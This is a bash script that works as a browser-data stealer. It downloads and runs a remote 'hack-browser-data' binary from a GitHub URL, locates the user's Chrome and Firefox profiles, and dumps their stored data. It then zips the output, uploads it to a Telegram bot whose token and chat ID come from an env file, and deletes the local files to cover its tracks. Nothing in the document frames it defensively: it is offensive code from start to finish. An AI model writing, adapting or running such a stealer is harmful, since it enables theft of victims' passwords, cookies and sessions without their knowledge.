#!/bin/bash

# Function to download tool from repo if directory does not exist
download_tool() {
    local directory="$1"
    local file="$2"
    local tool_url="$3"
    
    if [ ! -d "$directory" ]; then
        mkdir "$directory"
        curl -o  "$directory/$file" "$tool_url"
        chmod +x "$directory/$file"
    fi
}

# Function to run hack-browser-data command and generate result file
run_hack_browser_data() {
    local browser="$1"
    local profile_path="$2"
    local output_dir="$3"
    
    ./hack-browser-data -b "$browser" -p "$profile_path" -f json -dir "$output_dir"
}

# Function to zip result directories
zip_results() {
    local output_zip="$1"
    shift
    zip -r "$output_zip" "$@"
}

# Function to send zip file as document to Telegram Bot
send_results_to_telegram() {
    local bot_token="$1"
    local chat_id="$2"
    local zip_file="$3"
    
    curl -F document=@"$zip_file" "https://api.telegram.org/bot$bot_token/sendDocument?chat_id=$chat_id"
}

# Read environment variables from env file
env_file="env/bot.env"
if [ ! -f "$env_file" ]; then
    echo "Tệp env không tồn tại."
    exit 1
fi
source "$env_file"

cd /tmp

# Download tool from repo
download_tool "tool" "hack-browser-data" "https://raw.githubusercontent.com/pyopywhiz/hack/master/hack-browser-data" 

cd tool


# Run hack-browser-data and generate result files for Chrome and Firefox
chrome_profile=$(find ~ -type d -path "*/.config/google-chrome/Profile 1" | head -n 1)
firefox_profile=$(find ~ -type d -path "*/.mozilla/firefox/*.default" | head -n 1)

run_hack_browser_data "chrome" "$chrome_profile" "chrome"
run_hack_browser_data "firefox" "$firefox_profile" "firefox"

# Zip result directories
zip_results "results.zip" "chrome" "firefox"

# Send zip file to Telegram Bot
send_results_to_telegram "$BOT_TOKEN" "$CHAT_ID" "results.zip"

# Clean up result directories and zip file
rm -rf chrome firefox results.zip
